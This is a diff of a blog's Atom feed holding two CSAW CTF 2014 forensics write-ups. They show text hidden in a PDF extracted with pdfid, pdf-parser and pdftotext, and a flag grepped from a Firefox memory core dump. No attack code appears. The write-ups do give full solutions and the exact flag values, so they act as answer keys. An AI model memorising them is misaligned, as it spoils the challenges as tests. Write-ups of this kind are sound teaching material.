class="n"&gt;VB&lt;/span&gt; &lt;span class="n"&gt;macro&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;examine&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;However, this problem turned out to be very simple...&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Finding the Flag in 10 Seconds&lt;/h2&gt;
 &lt;p&gt;Yeap, this easy:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1. Download the PDF file.
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Download&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;PDF&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 
-2. Open it in any PDF viewer.
+&lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;Open&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;PDF&lt;/span&gt; &lt;span class="n"&gt;viewer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 
-3. CTRL+A (select all the contend).
+&lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;CTRL&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;contend&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
 
-4. You see the flag!
+&lt;span class="mf"&gt;4.&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;see&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/b03EehK.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/b03EehK.png" /&gt;&lt;/p&gt;
 &lt;p&gt;OK, we were luck. Keep reading if you think this was too easy.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Analyzing the ID and the Streams in a PDF File&lt;/h2&gt;
 &lt;p&gt;Let's suppose we had no clue that the flag would just be a text in the file. In this case, we would want to examine the file's structure. For this task we use the &lt;a href="http://blog.didierstevens.com/programs/pdf-tools/"&gt;PDF Tool&lt;/a&gt; suite, which is written in Python.&lt;/p&gt;
 &lt;h4&gt;pdfid&lt;/h4&gt;
 &lt;p&gt;We start with &lt;em&gt;pdfid.py&lt;/em&gt;, which parses the PDF  looking for certain  keywords. We download and unzip that script, and then we make it an executable:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip pdfid_v0_1_2.zip
-$ chmod a+x pdfid.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip pdfid_v0_1_2.zip
+&lt;span class="nv"&gt;$ &lt;/span&gt;chmod a+x pdfid.py
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Running over our file gives:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdfid.py pdf.pdf
-PDFiD &lt;span class="m"&gt;0&lt;/span&gt;.1.2 pdf.pdf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdfid.py pdf.pdf
+PDFiD 0.1.2 pdf.pdf
  PDF Header: %PDF-1.3
- obj                   &lt;span class="m"&gt;20&lt;/span&gt;
- endobj                &lt;span class="m"&gt;19&lt;/span&gt;
- stream                &lt;span class="m"&gt;10&lt;/span&gt;
- endstream             &lt;span class="m"&gt;10&lt;/span&gt;
- xref                   &lt;span class="m"&gt;1&lt;/span&gt;
- trailer                &lt;span class="m"&gt;1&lt;/span&gt;
- startxref              &lt;span class="m"&gt;1&lt;/span&gt;
- /Page                  &lt;span class="m"&gt;1&lt;/span&gt;
- /Encrypt               &lt;span class="m"&gt;0&lt;/span&gt;
- /ObjStm                &lt;span class="m"&gt;0&lt;/span&gt;
- /JS                    &lt;span class="m"&gt;0&lt;/span&gt;
- /JavaScript            &lt;span class="m"&gt;0&lt;/span&gt;
- /AA                    &lt;span class="m"&gt;0&lt;/span&gt;
- /OpenAction            &lt;span class="m"&gt;0&lt;/span&gt;
- /AcroForm              &lt;span class="m"&gt;0&lt;/span&gt;
- /JBIG2Decode           &lt;span class="m"&gt;0&lt;/span&gt;
- /RichMedia             &lt;span class="m"&gt;0&lt;/span&gt;
- /Launch                &lt;span class="m"&gt;0&lt;/span&gt;
- /EmbeddedFile          &lt;span class="m"&gt;0&lt;/span&gt;
- /XFA                   &lt;span class="m"&gt;0&lt;/span&gt;
- /Colors &amp;gt; &lt;span class="m"&gt;2&lt;/span&gt;^24         &lt;span class="m"&gt;0&lt;/span&gt;
+ obj                   20
+ endobj                19
+ stream                10
+ endstream             10
+ xref                   1
+ trailer                1
+ startxref              1
+ /Page                  1
+ /Encrypt               0
+ /ObjStm                0
+ /JS                    0
+ /JavaScript            0
+ /AA                    0
+ /OpenAction            0
+ /AcroForm              0
+ /JBIG2Decode           0
+ /RichMedia             0
+ /Launch                0
+ /EmbeddedFile          0
+ /XFA                   0
+ /Colors &amp;gt; 2^24         0
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;All right, no funny stuff going on here. We need to look deeper into each of the these streams.&lt;/p&gt;
 &lt;h4&gt;pdf-parser&lt;/h4&gt;
 &lt;p&gt;We download &lt;em&gt;pdf-parser.py&lt;/em&gt;, which is used to search for all the fundamental elements in a PDF file. Let's take a closer look:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip pdf-parser_V0_4_3.zip
-$ chmod a+x pdf-parser.py
-$ ./pdf-parser.py
-Usage: pdf-parser.py &lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt; pdf-file&lt;span class="p"&gt;|&lt;/span&gt;zip-file&lt;span class="p"&gt;|&lt;/span&gt;url
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip pdf-parser_V0_4_3.zip
+&lt;span class="nv"&gt;$ &lt;/span&gt;chmod a+x pdf-parser.py
+&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py
+Usage: pdf-parser.py &lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt; pdf-file|zip-file|url
 pdf-parser, use it to parse a PDF document
 
 Options:
@@ -757,57 +722,50 @@ Options:
                         id of indirect object being referenced &lt;span class="o"&gt;(&lt;/span&gt;version
                         independent&lt;span class="o"&gt;)&lt;/span&gt;
   -e ELEMENTS, --elements&lt;span class="o"&gt;=&lt;/span&gt;ELEMENTS
-                        &lt;span class="nb"&gt;type&lt;/span&gt; of elements to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;cxtsi&lt;span class="o"&gt;)&lt;/span&gt;
-  -w, --raw             raw output &lt;span class="k"&gt;for&lt;/span&gt; data and filters
-  -a, --stats           display stats &lt;span class="k"&gt;for&lt;/span&gt; pdf document
-  -t TYPE, --type&lt;span class="o"&gt;=&lt;/span&gt;TYPE  &lt;span class="nb"&gt;type&lt;/span&gt; of indirect object to &lt;span class="k"&gt;select&lt;/span&gt;
+                        &lt;span class="nb"&gt;type &lt;/span&gt;of elements to &lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;cxtsi&lt;span class="o"&gt;)&lt;/span&gt;
+  -w, --raw             raw output &lt;span class="k"&gt;for &lt;/span&gt;data and filters
+  -a, --stats           display stats &lt;span class="k"&gt;for &lt;/span&gt;pdf document
+  -t TYPE, --type&lt;span class="o"&gt;=&lt;/span&gt;TYPE  &lt;span class="nb"&gt;type &lt;/span&gt;of indirect object to &lt;span class="k"&gt;select&lt;/span&gt;
   -v, --verbose         display malformed PDF elements
   -x EXTRACT, --extract&lt;span class="o"&gt;=&lt;/span&gt;EXTRACT
                         filename to extract malformed content to
-  -H, --hash            display &lt;span class="nb"&gt;hash&lt;/span&gt; of objects
+  -H, --hash            display &lt;span class="nb"&gt;hash &lt;/span&gt;of objects
   -n, --nocanonicalizedoutput
-                        &lt;span class="k"&gt;do&lt;/span&gt; not canonicalize the output
+                        &lt;span class="k"&gt;do &lt;/span&gt;not canonicalize the output
   -d DUMP, --dump&lt;span class="o"&gt;=&lt;/span&gt;DUMP  filename to dump stream content to
   -D, --debug           display debug info
-  -c, --content         display the content &lt;span class="k"&gt;for&lt;/span&gt; objects without streams or
+  -c, --content         display the content &lt;span class="k"&gt;for &lt;/span&gt;objects without streams or
                         with streams without filters
   --searchstream&lt;span class="o"&gt;=&lt;/span&gt;SEARCHSTREAM
                         string to search in streams
   --unfiltered          search in unfiltered streams
-  --casesensitive       &lt;span class="k"&gt;case&lt;/span&gt; sensitive search in streams
+  --casesensitive       &lt;span class="k"&gt;case &lt;/span&gt;sensitive search in streams
   --regex               use regex to search in streams
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Very interesting! We run it with our file, searching for the string &lt;em&gt;/ProcSet&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./pdf-parser.py  pdf.pdf &lt;span class="p"&gt;|&lt;/span&gt; grep  /ProcSet
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./pdf-parser.py  pdf.pdf | grep  /ProcSet
         /ProcSet &lt;span class="o"&gt;[&lt;/span&gt; /ImageC /Text /PDF /ImageI /ImageB &lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Awesome! Even though we don't see any text in the file (when we opened it in the PDF viewer), there is text somewhere!&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Getting Text from PDF&lt;/h2&gt;
 &lt;p&gt;A good way to extract text from a pdf is using &lt;a href="http://en.wikipedia.org/wiki/Pdftotext"&gt;pdftotext&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pdftotext pdf.pdf
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;pdftotext pdf.pdf
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;You should get a &lt;code&gt;pdf.txt&lt;/code&gt; file. Reading it with Linux's commands &lt;code&gt;cat&lt;/code&gt; or &lt;code&gt;strings&lt;/code&gt;gives you the flag:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ strings pdf.txt
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;strings pdf.txt
 flag&lt;span class="o"&gt;{&lt;/span&gt;security_through_obscurity&lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;As a note, there are several other PDF forensics tools that are worth to be mentioned: &lt;a href="http://esec-lab.sogeti.com/pages/Origami"&gt;Origami&lt;/a&gt; (pdfextract extracts JavaScript from PDF files), &lt;a href="http://blog.zeltser.com/post/3235995383/pdf-stream-dumper-malicious-file-analysis"&gt;PDF Stream Dumper&lt;/a&gt; (several PDF analysis tools), &lt;a href="http://blog.zeltser.com/post/6780160077/peepdf-malicious-pdf-analysis"&gt;Peepdf&lt;/a&gt; (command-line shell for examining PDF), &lt;a href="https://github.com/9b/pdfxray_lite"&gt;PDF X-RAY Lite&lt;/a&gt; (creates an HTML report with decoded file structure and contents), &lt;a href="http://blog.zeltser.com/post/12615013257/extracting-swf-from-pdf-using-swf-mastah"&gt;SWF mastah&lt;/a&gt; (extracts SWF objects), &lt;a href="for examining and decoding structure and content of PDF files"&gt;Pyew&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="pdf-parser"></category><category term="pdftotext"></category></entry><entry><title>CSAW CTF 2014 - Forensics 100: "dumpster diving"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-100-dumpster-diving.html" rel="alternate"></link><published>2014-09-22T06:20:00-04:00</published><updated>2014-09-22T06:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-forensics-100-dumpster-diving.html</id><summary type="html">&lt;p&gt;This was the first forensic challenge. It starts with the following text:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;dumpsters are cool, but cores are cooler&lt;/p&gt;
-&lt;p&gt;Written by marc&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/606580b079e73e14ab2751e35d22ad44/firefox.mem.zip"&gt;firefox.mem.zip&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2&gt;Unziping firefox.mem.zip&lt;/h2&gt;
-&lt;p&gt;The given file has a funny extension &lt;em&gt;.mem.zip&lt;/em&gt;. Before we go ahead and unzip it, let's try to learn more …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This was the first forensic challenge. It starts with the following text:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="pdf-parser"></category><category term="pdftotext"></category></entry><entry><title>CSAW CTF 2014 - Forensics 100: "dumpster diving"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-100-dumpster-diving.html" rel="alternate"></link><updated>2014-09-22T06:20:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:csaw-ctf-2014-forensics-100-dumpster-diving.html</id><summary type="html">&lt;p&gt;This was the first forensic challenge. It starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;dumpsters are cool, but cores are cooler&lt;/p&gt;
 &lt;p&gt;Written by marc&lt;/p&gt;
@@ -815,24 +773,24 @@ flag&lt;span class="o"&gt;{&lt;/span&gt;security_through_obscurity&lt;span class
 &lt;/blockquote&gt;
 &lt;h2&gt;Unziping firefox.mem.zip&lt;/h2&gt;
 &lt;p&gt;The given file has a funny extension &lt;em&gt;.mem.zip&lt;/em&gt;. Before we go ahead and unzip it, let's try to learn more about this file. To do this we choose to use the Linux's command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file --help
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file --help
 Usage: file &lt;span class="o"&gt;[&lt;/span&gt;OPTION...&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;FILE...&lt;span class="o"&gt;]&lt;/span&gt;
-Determine &lt;span class="nb"&gt;type&lt;/span&gt; of FILEs.
+Determine &lt;span class="nb"&gt;type &lt;/span&gt;of FILEs.
 
-      --help                 display this &lt;span class="nb"&gt;help&lt;/span&gt; and &lt;span class="nb"&gt;exit&lt;/span&gt;
+      --help                 display this &lt;span class="nb"&gt;help &lt;/span&gt;and &lt;span class="nb"&gt;exit&lt;/span&gt;
   -v, --version              output version information and &lt;span class="nb"&gt;exit&lt;/span&gt;
   -m, --magic-file LIST      use LIST as a colon-separated list of magic
                                number files
   -z, --uncompress           try to look inside compressed files
-  -b, --brief                &lt;span class="k"&gt;do&lt;/span&gt; not prepend filenames to output lines
+  -b, --brief                &lt;span class="k"&gt;do &lt;/span&gt;not prepend filenames to output lines
   -c, --checking-printout    print the parsed form of the magic file, use in
                                conjunction with -m to debug a new magic file
                                before installing it
-  -e, --exclude TEST         exclude TEST from the list of &lt;span class="nb"&gt;test&lt;/span&gt; to be
-                               performed &lt;span class="k"&gt;for&lt;/span&gt; file. Valid tests are:
+  -e, --exclude TEST         exclude TEST from the list of &lt;span class="nb"&gt;test &lt;/span&gt;to be
+                               performed &lt;span class="k"&gt;for &lt;/span&gt;file. Valid tests are:
                                apptype, ascii, cdf, compress, elf, encoding,
                                soft, tar, text, tokens
-  -f, --files-from FILE      &lt;span class="nb"&gt;read&lt;/span&gt; the filenames to be examined from FILE
+  -f, --files-from FILE      &lt;span class="nb"&gt;read &lt;/span&gt;the filenames to be examined from FILE
   -F, --separator STRING     use string as separator instead of &lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
 &lt;span class="s1"&gt;  -i, --mime                 output MIME type strings (--mime-type and&lt;/span&gt;
 &lt;span class="s1"&gt;                               --mime-encoding)&lt;/span&gt;
@@ -856,13 +814,13 @@ Determine &lt;span class="nb"&gt;type&lt;/span&gt; of FILEs.
 
 
 &lt;p&gt;We find the flag &lt;code&gt;-z&lt;/code&gt;, which allows us to look inside the zipped files:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$  file -z firefox.mem.zip
-firefox.mem.zip: ELF &lt;span class="m"&gt;64&lt;/span&gt;-bit LSB core file x86-64, version &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Zip archive data, at least v2.0 to extract&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; file -z firefox.mem.zip
+firefox.mem.zip: ELF 64-bit LSB core file x86-64, version 1 &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Zip archive data, at least v2.0 to extract&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Cool! So let's go ahead and unzip this file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unzip firefox.mem.zip nzip firefox.mem.zip
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip firefox.mem.zip nzip firefox.mem.zip
 Archive:  firefox.mem.zip
   inflating: firefox.mem
    creating: __MACOSX/
@@ -870,41 +828,41 @@ Archive:  firefox.mem.zip
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Extra: Learning More about the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
 &lt;p&gt;This is a very weird file extension. If you google &lt;em&gt;.mem&lt;/em&gt;, you don't find much, it's clear it's a memory file, but what now?  From the &lt;em&gt;file&lt;/em&gt; command, we learned that this is an &lt;em&gt;ELF 64-bit LSB core&lt;/em&gt;. Let's understand this  by parts.&lt;/p&gt;
 &lt;p&gt;An &lt;a href="http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"&gt;ELF&lt;/a&gt; file  (Executable and Linkable Format) is a standard file format for executables, object code, shared libraries, and core dumps. The cool thing about ELF is that it's not bound to any particular architecture.&lt;/p&gt;
 &lt;p&gt;In Linux, we can use the command &lt;a href="http://linux.die.net/man/1/readelf"&gt;readelf&lt;/a&gt; to displays information about ELF files:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ readelf firefox.mem
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;readelf firefox.mem
 Usage: readelf &amp;lt;option&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&amp;gt; elf-file&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
  Display information about the contents of ELF format files
  Options are:
   -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I
   -h --file-header       Display the ELF file header
   -l --program-headers   Display the program headers
-     --segments          An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --program-headers
+     --segments          An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --program-headers
   -S --section-headers   Display the sections&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; header
-     --sections          An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --section-headers
+     --sections          An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --section-headers
   -g --section-groups    Display the section groups
   -t --section-details   Display the section details
   -e --headers           Equivalent to: -h -l -S
   -s --syms              Display the symbol table
-     --symbols           An &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; --syms
+     --symbols           An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --syms
   --dyn-syms             Display the dynamic symbol table
-  -n --notes             Display the core notes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
-  -r --relocs            Display the relocations &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
-  -u --unwind            Display the unwind info &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
-  -d --dynamic           Display the dynamic section &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
-  -V --version-info      Display the version sections &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; present&lt;span class="o"&gt;)&lt;/span&gt;
-  -A --arch-specific     Display architecture specific information &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; any&lt;span class="o"&gt;)&lt;/span&gt;
+  -n --notes             Display the core notes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
+  -r --relocs            Display the relocations &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
+  -u --unwind            Display the unwind info &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
+  -d --dynamic           Display the dynamic section &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
+  -V --version-info      Display the version sections &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
+  -A --arch-specific     Display architecture specific information &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;any&lt;span class="o"&gt;)&lt;/span&gt;
   -c --archive-index     Display the symbol/file index in an archive
   -D --use-dynamic       Use the dynamic section info when displaying symbols
-  -x --hex-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
-                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as bytes
-  -p --string-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
-                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as strings
-  -R --relocated-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt;
-                         Dump the contents of section &amp;lt;number&lt;span class="p"&gt;|&lt;/span&gt;name&amp;gt; as relocated bytes
+  -x --hex-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
+                         Dump the contents of section &amp;lt;number|name&amp;gt; as bytes
+  -p --string-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
+                         Dump the contents of section &amp;lt;number|name&amp;gt; as strings
+  -R --relocated-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
+                         Dump the contents of section &amp;lt;number|name&amp;gt; as relocated bytes
   -w&lt;span class="o"&gt;[&lt;/span&gt;lLiaprmfFsoRt&lt;span class="o"&gt;]&lt;/span&gt; or
   --debug-dump&lt;span class="o"&gt;[=&lt;/span&gt;rawline,&lt;span class="o"&gt;=&lt;/span&gt;decodedline,&lt;span class="o"&gt;=&lt;/span&gt;info,&lt;span class="o"&gt;=&lt;/span&gt;abbrev,&lt;span class="o"&gt;=&lt;/span&gt;pubnames,&lt;span class="o"&gt;=&lt;/span&gt;aranges,&lt;span class="o"&gt;=&lt;/span&gt;macro,&lt;span class="o"&gt;=&lt;/span&gt;frames,
                &lt;span class="o"&gt;=&lt;/span&gt;frames-interp,&lt;span class="o"&gt;=&lt;/span&gt;str,&lt;span class="o"&gt;=&lt;/span&gt;loc,&lt;span class="o"&gt;=&lt;/span&gt;Ranges,&lt;span class="o"&gt;=&lt;/span&gt;pubtypes,
@@ -914,7 +872,7 @@ Usage: readelf &amp;lt;option&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class
   --dwarf-start&lt;span class="o"&gt;=&lt;/span&gt;N        Display DIEs starting with N, at the same depth
                          or deeper
   -I --histogram         Display histogram of bucket list lengths
-  -W --wide              Allow output width to exceed &lt;span class="m"&gt;80&lt;/span&gt; characters
+  -W --wide              Allow output width to exceed 80 characters
   @&amp;lt;file&amp;gt;                Read options from &amp;lt;file&amp;gt;
   -H --help              Display this information
   -v --version           Display the version number of readelf
@@ -922,13 +880,13 @@ Usage: readelf &amp;lt;option&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class
 
 
 &lt;p&gt;In addition, &lt;a href="http://en.wikipedia.org/wiki/Linux_Standard_Base"&gt;LSB&lt;/a&gt; stands for &lt;em&gt;Linux Standard Base&lt;/em&gt;, which is a joint project by several Linux distributions. It specifies standard libraries, a number of commands and utilities that extend the POSIX standard, the layout of the file system hierarchy, run levels, the printing system, etc.&lt;/p&gt;
-&lt;hr&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Extracting Information from the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
 &lt;p&gt;It turned out that we don't even need to know anything about the file to find the flag. All we need to do is to search for the &lt;em&gt;flag&lt;/em&gt; string:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat firefox.mem &lt;span class="p"&gt;|&lt;/span&gt; grep -a &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat firefox.mem | grep -a &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
 P��negativeone_or_fdZZZZZZZZZZZZnegativeone_or_nothingZZnegativeone_or_ssize_tZZd_name_extra_sizeZZZZZZZZZZZZnull_or_dirent_ptrZZZZZZZZZZOSFILE_SIZEOF_DIRZZZZZZZZZZZZ���� 3���������ZZZZZZZH�f�L��L��ZZ����@�m���������ZZZZZZZAG�@r���y��ZZZZZZZZflag&lt;span class="o"&gt;{&lt;/span&gt;cd69b4957f06cd818d7bf3d61980e291&lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Yay! We found the flag: &lt;strong&gt;cd69b4957f06cd818d7bf3d61980e291&lt;/strong&gt;!&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="readelf"></category><category term="mem"></category></entry></feed>
+&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="readelf"></category><category term="mem"></category></entry></feed>
